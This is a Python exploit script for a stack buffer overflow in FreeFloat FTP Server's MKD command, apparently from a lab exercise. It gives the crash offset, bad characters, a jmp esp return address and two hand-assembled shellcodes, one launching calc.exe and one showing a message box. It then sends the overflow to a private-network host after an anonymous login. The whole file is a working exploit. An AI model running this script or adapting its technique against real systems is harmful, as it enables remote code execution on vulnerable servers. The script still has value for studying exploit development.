#!/bin/env python
############################################################################################################################################
# Exploit FreeFloatFTP Server Exploit
# author: Tiago Carvalho
# MKD command buffer overflow. 
# OFFSET 247
# Badchars: \x00\x0A\x0D
# Message=  0x77def049 : jmp esp |  {PAGE_EXECUTE_READ} [ADVAPI32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 #(C:\WINDOWS\system32\ADVAPI32.dll) 
#77C35459   54               PUSH ESP
# WinExec is located at 0x7c8623ad in kernel32.dll
# MessageBoxA is located at 0x7e4507ea in user32.dll
############################################################################################################################################
import socket
import sys
from struct import pack

IP="172.16.206.132"

WinExec = (
"\x33\xc0"                  # XOR EAX,EAX
"\x50"                      # PUSH EAX      => padding for lpCmdLine
"\x68\x2E\x65\x78\x65"      # PUSH ".exe" 
"\x68\x63\x61\x6C\x63"      # PUSH "calc" 
"\x8B\xC4"                  # MOV EAX,ESP 
"\x6A\x01"                  # PUSH 1
"\x50"                      # PUSH EAX 
"\xBB\xAD\x23\x86\x7C"      # MOV EBX,kernel32.WinExec 
"\xFF\xD3"                  # CALL EBX
)

MessageBox = (
"\x33\xc0"                  # XOR EAX,EAX       Zero out EAX register
"\x50"                      # PUSH EAX          Push EAX to have null-byte padding for "b33f"
"\x68\x62\x33\x33\x66"      # PUSH "b33f"       Push The ASCII string to the stack
"\x8B\xCC"                  # MOV ECX,ESP       Put a pointer to lpCaption string in ECX
"\x50"                      # PUSH EAX          Push EAX to have null-byte padding for "Pop the box!"  
"\x68\x62\x6F\x78\x21"      # PUSH "box!"       Push The ASCII string to the stack
"\x68\x74\x68\x65\x20"      # PUSH "the "       Push The ASCII string to the stack
"\x68\x50\x6F\x70\x20"      # PUSH "Pop "       Push The ASCII string to the stack
"\x8B\xD4"                  # MOV EDX,ESP       Put a pointer to lpText string in EDX
"\x50"                      # PUSH EAX          Push uType=0x00000000
"\x51"                      # PUSH ECX          Push lpCaption
"\x52"                      # PUSH EDX          Push lpText
"\x50"                      # PUSH EAX          Push hWnd=0x00000000
"\xBE\xEA\x07\x45\x7E"      # Move the pointer to MessageBoxA() into ESI
"\xFF\xD6"                  # CALL ESI          

)
ret = pack('<L', 0x77def049)
payload = "A" * 247 + ret + "\x90" * 20 + MessageBox + "C" * (745 - len(MessageBox))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((IP,21))
 
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + payload + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close